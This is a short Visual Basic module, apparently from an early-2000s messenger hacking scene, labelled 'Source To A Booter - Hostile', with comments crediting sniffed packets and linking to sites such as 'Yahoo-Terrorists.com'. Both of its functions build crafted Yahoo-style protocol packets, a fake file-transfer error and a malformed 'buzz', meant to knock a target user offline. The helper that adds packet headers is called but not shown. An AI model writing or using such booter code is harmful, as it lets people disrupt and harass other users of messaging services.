Attribute VB_Name = "Module1"
'Source To A Booter - Hostile
'Well i sniffed these 2 packets my self so if you use them give me credit plz where it is needed
'Don't be lame and just change the colors of this example or w/e this shit is to learn from
'www.Yahoo-Terrorists.com
'www.Leet-Programmers.com
'www.The-Source.org
Public Function Error(WhoFrom As String, WhoTo As String) As String
Dim Pck As String
Pck = "5À€" & WhoTo & "À€49À€FILEXFERÀ€1À€" & WhoFrom & "À€13À€5À€54À€MSG1.0À€"
Error = Header("4D", Pck)
Debug.Print Error
End Function
Public Function HostileBuzz(WhoFrom As String, WhoTo As String) As String
Pck = "1À€" & WhoFrom & "À€5À€" & WhoTo & "++" & "À€14À€<ding>À€97À€1À€"
HostileBuzz = Header("06", Pck)
Debug.Print HostileBuzz
End Function
